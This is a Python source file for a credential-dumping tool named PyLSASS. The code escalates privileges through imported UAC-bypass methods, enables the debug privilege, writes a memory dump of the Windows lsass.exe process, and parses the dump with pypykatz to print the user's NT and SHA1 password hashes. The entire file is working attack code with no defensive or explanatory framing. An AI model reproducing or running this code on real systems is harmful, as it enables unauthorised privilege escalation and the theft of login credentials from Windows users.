import ctypes
import os
import psutil
from pypykatz.pypykatz import pypykatz
import sys
import win32api
from win32com.shell import shellcon
from win32com.shell.shell import ShellExecuteEx
import win32con
import win32file
import win32security
import winreg

sys.path.insert(1, f"{sys.path[0]}\\winpwnage\\")

from winpwnage.functions.uac.uacMethod1 import uacMethod1
from winpwnage.functions.uac.uacMethod2 import uacMethod2
from winpwnage.functions.uac.uacMethod3 import uacMethod3
from winpwnage.functions.uac.uacMethod4 import uacMethod4
from winpwnage.functions.uac.uacMethod5 import uacMethod5
from winpwnage.functions.uac.uacMethod6 import uacMethod6
from winpwnage.functions.uac.uacMethod7 import uacMethod7
from winpwnage.functions.uac.uacMethod8 import uacMethod8
from winpwnage.functions.uac.uacMethod9 import uacMethod9
from winpwnage.functions.uac.uacMethod10 import uacMethod10
from winpwnage.functions.uac.uacMethod11 import uacMethod11
from winpwnage.functions.uac.uacMethod12 import uacMethod12
from winpwnage.functions.uac.uacMethod13 import uacMethod13
from winpwnage.functions.uac.uacMethod14 import uacMethod14
from winpwnage.functions.uac.uacMethod15 import uacMethod15


dbghelp = ctypes.windll.dbghelp

class PyLSASS:

    def __init__(self, user = os.getlogin(), bypass_function = uacMethod4):
        self._bypass_function = bypass_function

        if not self._is_admin():
            self._run_as_admin()
            sys.exit(0)

        self.user = user
        self.credentials = {"NT": None, "SHA1": None}

        self._process_name = "lsass.exe"
        self._pid = self._get_pid()
        self._file_name = f"{self._process_name.split('.')[0]}.dmp"

        self._adjust_privilege()
        self._create_dump()
        self._parse()

    def _is_admin(self):
        return bool(ctypes.windll.shell32.IsUserAnAdmin())

    def _run_as_admin(self):
        self._bypass_function([r"C:\Windows\System32\cmd.exe", "/k", "python", f"{__file__}"])

    def _get_pid(self):
        for process in psutil.process_iter():
            if self._process_name in process.name():
                return process.pid

    def _check_privilege(self):
        flags = win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
        token_handle = win32security.OpenProcessToken(win32api.GetCurrentProcess(), flags)
        id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
        return bool(win32security.GetTokenInformation(token_handle, id))

    def _adjust_privilege(self):
        flags = win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
        token_handle = win32security.OpenProcessToken(win32api.GetCurrentProcess(), flags)
        id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
        enabled_privilege = [(id, win32security.SE_PRIVILEGE_ENABLED)]
        win32security.AdjustTokenPrivileges(token_handle, 0, enabled_privilege)
        return self._check_privilege()

    def _create_dump(self):
        process_handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, 0, self._pid)
        file_handle = win32file.CreateFile(self._file_name, win32file.GENERIC_READ | win32file.GENERIC_WRITE, win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE, None, win32file.CREATE_ALWAYS, win32file.FILE_ATTRIBUTE_NORMAL, None)
        success = dbghelp.MiniDumpWriteDump(process_handle.handle, self._pid, file_handle.handle, 2, None, None, None)
        return bool(success)

    def _parse(self):
        parsing = pypykatz.parse_minidump_file(self._file_name)
        for luid in parsing.logon_sessions:
            for credentials in getattr(parsing.logon_sessions[luid], "msv_creds", []):
                username = getattr(credentials, "username", None)
                if username == self.user:
                    self.credentials["NT"] = getattr(credentials, "NThash", None).hex()
                    self.credentials["SHA1"] = getattr(credentials, "SHAHash", None).hex()


if __name__ == "__main__":
    pylsass = PyLSASS()
    print(pylsass.credentials)
